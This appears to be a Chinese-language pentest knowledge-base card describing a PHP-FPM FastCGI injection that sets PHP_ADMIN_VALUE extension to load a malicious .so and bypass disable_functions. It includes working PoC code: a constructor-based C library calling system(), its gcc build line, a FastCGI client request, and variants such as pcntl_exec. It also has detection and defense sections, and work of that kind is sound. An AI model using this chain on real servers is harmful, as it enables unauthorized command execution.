---
id: web-php-rce-fastcgi-php-admin-value-extension-so
title: PHP-FPM FastCGI 注入 PHP_ADMIN_VALUE extension：加载恶意 .so 构造函数绕过 disable_functions
type: scenario
domain: web
path: web/php/rce
technique: php-fpm-fastcgi-extension-loading-bypass
tags:
- php
- rce
- disable-functions
- fastcgi
- php-fpm
- shared-library
- bypass
- webshell
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V63
  verified_at: '2026-11-05T12:27:54+08:00'
  notes: '已对照原文与图 20-29 核对：多版本 php-cgi-*.sock、disable_functions/open_basedir、PHP_VALUE vs PHP_ADMIN_VALUE 的 on_modify 差异、pcntl_exec 变体、extension=/tmp/evil.so 加载恶意 .so 均与原文一致。图 29 证实输出 uid=1000(www) 且出现 Unknown: Invalid library (maybe not a PHP library) ''/tmp/evil.so''，卡内“构造函数先执行、随后报 Invalid library”的描述有截图支撑。原文未给 PHP/FPM 版本区间，未设置 affected_versions。未验证点：未本机复跑。'
url: /docs/web/php/rce/web-php-rce-fastcgi-php-admin-value-extension-so/
draft: false
kb_aliases:
- FastCGI 加载恶意扩展
- PHP_ADMIN_VALUE extension
- php-fpm 加载 so
- disable_functions 绕过 扩展
- extension=/tmp/evil.so
- FPM socket 命令执行
---

## 一句话结论

已获得 PHP 代码执行但命令函数被 `disable_functions` 禁用时，若可访问 PHP-FPM 的 Unix/TCP socket，可伪造 FastCGI 请求并在 `PHP_ADMIN_VALUE` 中写入 `extension=/tmp/evil.so`，让 FPM 用 `dlopen` 加载攻击者的共享库，库的构造函数在 C 层执行命令，从而绕过 PHP 函数表层面的禁用。

## 原理

- `disable_functions` 的效果发生在 PHP 启动阶段：`zend_disable_functions()` 把被禁函数从全局 `function_table` 中物理删除；这不是运行时可逆的状态。即使 `PHP_ADMIN_VALUE` 能把配置哈希表中的 `disable_functions` 改成空值，函数表里也没有对应条目了，调用仍会报 “has been disabled”。
- 配置指令的生效依赖 `on_modify` 回调：`allow_url_include` 注册时带 `OnUpdateBool` 回调，`PHP_ADMIN_VALUE` 改值会触发回调并更新 `core_globals`，所以运行时立即生效；`disable_functions` 注册时回调为 `NULL`，改值不会触发任何生效逻辑，且函数已在启动时被删除。
- `PHP_ADMIN_VALUE` 可以设置 `PHP_INI_SYSTEM` 级指令，包括 `extension`。FPM 处理请求时会按该指令 `dlopen` 指定的共享库；共享库的 `__attribute__((constructor))` 在加载时执行，代码运行在 C 层，不经过 PHP 函数表，因此 `disable_functions` 对它无效。
- 即使 `.so` 不是合法的 PHP 扩展（没有 `get_module`），`dlopen` 仍会先完成加载并执行构造函数，随后 PHP 才报 `Unknown: Invalid library (maybe not a PHP library)`；命令已经执行，错误信息不影响结果。把命令输出写到临时文件，再用第二个 FastCGI 请求 `file_get_contents` 读回即可拿到回显。
- 若目标某版本 PHP 未禁用 `pcntl_exec`，也可直接在 FastCGI 执行的代码里调用 `pcntl_exec('/bin/sh', ['-c', 'id > /tmp/out'])`；它会替换当前进程，命令执行后需另发请求读取输出文件。

## 触发条件

- 已能在目标上执行任意 PHP 代码（WebShell、文件包含、模板注入等），但 `system`/`exec`/`shell_exec` 等被 `disable_functions` 禁用。
- 能访问 PHP-FPM 的 Unix socket（如 `/tmp/php-cgi-72.sock`）或 TCP socket，且权限允许连接（socket 权限通常为 0666/0660）。
- 能上传或写入一个与目标架构/依赖兼容的 `.so` 文件（如 `/tmp/evil.so`）。
- FPM 允许通过 FastCGI 的 `PHP_ADMIN_VALUE` 设置 `extension`（多数默认配置允许；`security.limit_extensions` 只限制脚本后缀，不限制扩展加载）。
- 已知一个服务器上存在的 `.php` 文件作为 `SCRIPT_FILENAME`。

## 利用步骤

1. 读取 `phpinfo()`/`ini_get('disable_functions')`，确认命令函数被禁；枚举 `/tmp` 等目录下的 `php-cgi-*.sock`，确认 FPM 版本与 socket。
2. 编写恶意共享库：在构造函数中执行命令并写入文件。
   ```c
   #include <stdlib.h>
   __attribute__((__constructor__)) void init(void) {
       system("id > /tmp/id_result.txt 2>&1");
   }
   ```
   `gcc -Wall -fPIC -shared -nostartfiles -o evil.so evil.c -m64`
3. 上传 `evil.so` 到目标可读路径（如 `/tmp/evil.so`），确认文件存在、架构匹配。
4. 用 PHP 实现最小 FastCGI 客户端，向目标 socket 发送 `FCGI_PARAMS`：保留 `GATEWAY_INTERFACE`、`REQUEST_METHOD`、`SCRIPT_FILENAME`、`SCRIPT_NAME`、`REQUEST_URI`、`DOCUMENT_ROOT` 等字段，设置：
   `PHP_ADMIN_VALUE = "extension = /tmp/evil.so"`（也可同时设 `allow_url_include=On\nauto_prepend_file=php://input`）。
5. 发送一个 `FCGI_STDIN`（内容可为空或 `<?php echo 1;?>`），触发 FPM 加载扩展；即使响应报 `Invalid library`，构造函数已执行。
6. 再发一次 FastCGI 请求，执行 `<?php echo file_get_contents('/tmp/id_result.txt');?>` 读取命令输出。

## PoC

恶意库：

```c
#include <stdlib.h>
__attribute__((__constructor__)) void init(void) {
    system("id > /tmp/id_result.txt 2>&1");
}
```

FastCGI 参数（核心）：

```php
'PHP_ADMIN_VALUE' => "extension = /tmp/evil.so"
```

```php
$fcgi = new FCGIClient('unix:///tmp/php-cgi-72.sock');
$r = $fcgi->request(array(
  'GATEWAY_INTERFACE' => 'FastCGI/1.0',
  'REQUEST_METHOD' => 'POST',
  'SCRIPT_FILENAME' => '/www/wwwroot/xxx/index.php',
  'SCRIPT_NAME' => '/index.php',
  'REQUEST_URI' => '/index.php',
  'DOCUMENT_ROOT' => '/www/wwwroot/xxx',
  'PHP_ADMIN_VALUE' => "extension = /tmp/evil.so",
  'CONTENT_LENGTH' => 0,
), '');
```

```php
// 第二次请求读取输出
$payload = '<?php echo file_get_contents("/tmp/id_result.txt");?>';
```

说明：原文在宝塔/Linux 环境用该方式从 `php-cgi-72.sock` 成功执行 `id`（`uid=1000(www)`），并指出即使 PHP 报 `Invalid library`，构造函数仍会先执行；PoC 未在本会话执行。

## 变体与关联

- **PHP_VALUE vs PHP_ADMIN_VALUE**：`auto_prepend_file` 是 `PHP_INI_ALL`，`PHP_VALUE` 即可；`allow_url_include`、`extension` 是 `PHP_INI_SYSTEM`，必须用 `PHP_ADMIN_VALUE`。
- **pcntl_exec**：若某版本未禁用 `pcntl_exec`，可直接在 FastCGI 执行的 PHP 代码中替换进程执行命令；需二次请求读输出。
- **配置宽松的旧版本**：多版本 PHP 共存时逐个检查 `php.ini`，旧版本可能未禁用 `passthru`/`pcntl_exec`，可直接命令执行，无需扩展。
- **恶意扩展两种形态**：带 `get_module` 的合法 PHP 扩展（加载后还可注册函数）或仅含构造函数的普通 `.so`（加载即执行，随后报 invalid library）；后者实现最简单。
- 关联：[[web-generic-ssrf-gopher-fastcgi-fpm-auto-prepend]]（SSRF 版 FastCGI 注入）、[[web-php-rce-disable-functions-ld-preload]]（另一条子进程加载 .so 的路径）、[[pentest-privilege-escalation-php-fpm-world-writable-socket]]（FPM socket 权限问题）、[[web-php-open-basedir-bypass-classic-methods]]（同场景下的目录限制绕过）。

## 检测与防御

- **检测**：FPM 访问日志/慢日志中出现带 `PHP_ADMIN_VALUE`、`extension=`、`auto_prepend_file=php://input` 的请求；`Unknown: Invalid library (maybe not a PHP library)` 报错；Web 用户目录或 `/tmp` 出现新 `.so`；Web 进程 `dlopen` 非标准路径共享库；FPM socket 出现非 Nginx/Apache 来源的连接。
- **防御**：FPM 只监听 Unix socket 并设置严格权限（仅 Web 服务器用户可连）；在 pool 配置中固定 `php_admin_value[extension]` 为空并禁止覆盖；禁用 `allow_url_include`；`disable_functions` 同时禁用 `putenv`、`pcntl_exec`、`dl` 等原语；限制上传目录执行/写入权限；用 AppArmor/SELinux 限制 Web 进程加载任意 `.so`。
